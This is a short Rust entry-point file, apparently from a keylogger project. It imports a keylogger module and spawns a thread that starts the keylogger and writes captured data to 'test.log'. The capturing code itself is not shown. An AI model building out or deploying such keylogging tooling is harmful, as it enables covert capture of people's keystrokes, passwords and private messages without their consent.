mod keylogger;

use std::thread;

const KL_LOG_FILE: &'static str = "test.log";

fn main() {
    // Launch the keylogger and save data to file
    thread::spawn(move || {
        keylogger::start(KL_LOG_FILE);
    });
}
